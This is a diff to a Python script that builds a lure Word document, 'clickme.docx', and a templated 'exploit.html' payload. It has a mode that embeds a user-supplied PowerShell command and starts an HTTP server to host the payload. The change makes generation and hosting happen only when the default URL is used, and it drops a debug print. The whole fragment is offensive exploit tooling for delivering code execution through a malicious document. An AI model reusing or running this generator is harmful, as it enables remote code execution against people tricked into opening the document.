@@ -52,8 +52,6 @@ if __name__ == "__main__":
     if args.url != "localhost":  # if not default URL
         payload_url = f"{args.url}"  # payload_url is defined as-is by the user, user must specify protocol and port
 
-    print(payload_url)
-
     if args.mode == "command":
         # Original PowerShell execution variant
         command = args.command.replace("\"", "\\\"")
@@ -83,26 +81,26 @@ if __name__ == "__main__":
     print("Generated 'clickme.docx' in current directory")
 
 
-    # Prepare the HTML payload
-    if not os.path.exists("www"):
-        os.makedirs("www")
+    if args.url == "localhost":  # only generate & host the payload if default URL
+        # Prepare the HTML payload
+        if not os.path.exists("www"):
+            os.makedirs("www")
 
-    with open("src/exploit.html.tpl", "r") as f:
-        tmp = f.read()
+        with open("src/exploit.html.tpl", "r") as f:
+            tmp = f.read()
 
-    payload_html = tmp.format(payload = payload)
+        payload_html = tmp.format(payload = payload)
 
-    with open("www/exploit.html", "w") as f:
-        f.write(payload_html)
+        with open("www/exploit.html", "w") as f:
+            f.write(payload_html)
 
-    print("Generated 'exploit.html' in 'www' directory")
+        print("Generated 'exploit.html' in 'www' directory")
 
+        # Host the payload
+        class Handler(http.server.SimpleHTTPRequestHandler):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, directory="www", **kwargs)
 
-    # Host the payload
-    class Handler(http.server.SimpleHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, directory="www", **kwargs)
-
-    print(f"Serving payload on {payload_url}")
-    with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
-        httpd.serve_forever()
+        print(f"Serving payload on {payload_url}")
+        with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
+            httpd.serve_forever()
